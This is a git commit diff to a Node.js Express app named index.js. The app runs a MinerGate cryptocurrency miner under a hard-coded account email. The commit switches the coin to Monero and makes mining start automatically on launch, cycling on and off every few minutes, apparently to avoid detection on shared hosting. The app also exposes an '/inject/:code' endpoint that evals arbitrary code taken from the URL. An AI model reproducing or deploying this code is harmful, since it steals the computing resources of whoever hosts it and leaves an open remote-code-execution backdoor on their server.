33609104f00d1486b610f3ef1a804520911e77ce
Th1nkFast <31682030+Th1nkFast@users.noreply.github.com>
2017-09-20 15:08:02 -0300

    Update index.js

--- index.js
+++ index.js
@@ -1,23 +1,11 @@
 const { spawn } = require('child_process');
 const express = require('express');
 const app = express();
- 
+
 var state = false;
 var proc = '';
-var coin = 'bcn';
+var coin = 'xmr';
 
-const start = ()=>{
-    state = true;
-    proc = spawn('./opt/minergate-cli/express', ['-user', 'ian10_141@yahoo.com.br',"-"+coin, '1']);
-    proc.on('close', () => {
-      console.log('child process exited');
-      state = false;
-    });
-}
-const restart = ()=>{
-    proc.kill('SIGINT');
-    return start();
-}
 
 app.listen(process.env.PORT || 8080, ()=>{
   console.log('Example app listening on port 3000!');
@@ -25,16 +13,30 @@ app.listen(process.env.PORT || 8080, ()=>{
 app.get('/status', function (req, res) {
   	res.send('state: '+state);
 });
-app.get('/start', function (req, res) {
-   start();
-  	res.send('miner started');
-});
 app.get('/coin/:coin', function (req, res) {
   	coin = req.params.coin;
-   res.send('coin setted to: '+coin)
-   return restart();
+    res.send('coin setted to: '+coin)
 });
 app.get('/inject/:code', function (req, res) {
   	eval(req.params.code);
 });
-
+const start = ()=>{
+    state = true;
+    proc = spawn('./opt/minergate-cli/express', ['-user', 'ian10_141@yahoo.com.br', "-"+coin, '1']);
+    proc.on('close', () => {
+      console.log('child process exited');
+      state = false;
+    });
+}
+//start for the first time
+start();
+setTimeout(function(){
+  proc.kill('SIGINT');
+}, 3*60*1000);
+//keep starting and closing
+setInterval(function(){
+  start();
+  setTimeout(function(){
+    proc.kill('SIGINT');
+  }, 3*60*1000);
+}, 3.2*60*1000);
